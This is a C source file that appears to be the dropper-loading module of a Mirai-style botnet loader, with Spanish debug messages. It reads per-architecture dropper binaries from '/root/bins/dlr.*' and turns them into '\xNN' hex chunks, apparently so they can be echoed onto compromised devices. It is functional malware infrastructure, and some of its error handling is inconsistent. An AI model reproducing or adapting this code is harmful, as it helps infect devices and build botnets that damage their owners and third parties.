#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <glob.h>
#include "headers/includes.h"
#include "headers/binary.h"
#include <unistd.h>

static int bin_list_len = 0;
static struct binary **bin_list = NULL;

BOOL binary_init(void)
{
    int ret_glob;
    glob_t pglob;
    int i;

    char cwd[1024]; // Allocate a buffer to store the path
    
    if (getcwd(cwd, sizeof(cwd)) != NULL) {
#ifdef DEBUG
        printf("Directorio actual: %s\n", cwd);
#endif
    } else {
        perror("getcwd() error");
        return 1;
    }

#ifdef DEBUG
    printf("Buscando binarios en bin/dlr.*...\n");
#endif

    ret_glob = glob("/root/bins/dlr.*", GLOB_ERR, NULL, &pglob);
    if (ret_glob != 0) {
#ifdef DEBUG
        printf("Fallo en la carga: ");
        switch (ret_glob) {
            case GLOB_ABORTED:
                printf("Abortado.\n"); break;
            case GLOB_NOMATCH:
                printf("No hay resultados.\n"); break;
            case GLOB_NOSPACE:
                printf("Fallo de memoria.\n"); break;
            default:
                printf("Otro.\n"); break;
        }
#endif
        return;
    }

#ifdef DEBUG
    printf("%d binarios encontrados.\n", pglob.gl_pathc);
#endif

    for (i = 0; i < pglob.gl_pathc; i++) {
#ifdef DEBUG
        printf("%s\n", pglob.gl_pathv[i]);
#endif
        
        char file_name[256];
        struct binary *bin;

        bin_list = realloc(bin_list, (bin_list_len + 1) * sizeof (struct binary *));
        bin_list[bin_list_len] = calloc(1, sizeof (struct binary));
        bin = bin_list[bin_list_len++];

#ifdef DEBUG
        printf("(%d/%d) %s esta cargando...\n", i + 1, pglob.gl_pathc, pglob.gl_pathv[i]);
#endif
        strcpy(file_name, pglob.gl_pathv[i]);
        strtok(file_name, ".");
        strcpy(bin->arch, strtok(NULL, "."));
        load(bin, pglob.gl_pathv[i]);
    }

    globfree(&pglob);
    return TRUE;
}

struct binary *binary_get_by_arch(char *arch)
{
    int i;

    for (i = 0; i < bin_list_len; i++) {
        if (strcmp(arch, bin_list[i]->arch) == 0)
            return bin_list[i];
    }

    return NULL;
}

static BOOL load(struct binary *bin, char *fname)
{
    FILE *file;
    char rdbuf[BINARY_BYTES_PER_ECHOLINE];
    int n;

    if ((file = fopen(fname, "r")) == NULL) {
#ifdef DEBUG
        printf("Failed to open %s for parsing\n", fname);
#endif
        return FALSE;
    }

    while ((n = fread(rdbuf, sizeof (char), BINARY_BYTES_PER_ECHOLINE, file)) != 0) {
        char *ptr;
        int i;

        bin->hex_payloads = realloc(bin->hex_payloads, (bin->hex_payloads_len + 1) * sizeof (char *));
        bin->hex_payloads[bin->hex_payloads_len] = calloc(sizeof (char), (4 * n) + 8);
        ptr = bin->hex_payloads[bin->hex_payloads_len++];

        for (i = 0; i < n; i++)
            ptr += sprintf(ptr, "\\x%02x", (uint8_t)rdbuf[i]);
    }

    return FALSE;
}
